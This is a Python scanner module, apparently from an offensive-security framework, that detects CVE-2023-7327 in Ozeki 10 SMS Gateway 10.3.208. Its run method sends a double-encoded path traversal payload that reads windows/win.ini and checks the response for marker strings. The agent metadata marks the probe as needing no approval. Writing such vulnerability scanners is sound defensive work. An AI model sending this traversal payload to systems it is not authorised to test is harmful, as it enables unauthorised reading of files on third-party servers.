#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An arbitrary file read vulnerability, also known as a "path traversal" or "directory traversal" vulnerability,."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ozeki 10 SMS Gateway 10.3.208 - Arbitrary File Read Detection',
        'description': 'An arbitrary file read vulnerability, also known as a "path traversal" or "directory traversal" vulnerability, occurs when an attacker is able to access files on a system that they shouldn\'t have access to. This vulnerability arises from improper input validation or insufficient access controls in an application.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'ozeki', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-7327',
            'https://www.exploit-db.com/exploits/51646',
            'https://ozeki-sms-gateway.com/attachments/702/installwindows_1689352737_OzekiSMSGateway_10.3.208.zip',
        ],
        'cve': 'CVE-2023-7327',
    }

    def run(self):
        r = self.http_request(method="GET", path='/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/octet-stream', 'Mail', 'files',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Ozeki 10 SMS Gateway 10.3.208 - Arbitrary File Read detected",
                path='/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini',
            )
            return True
        return False

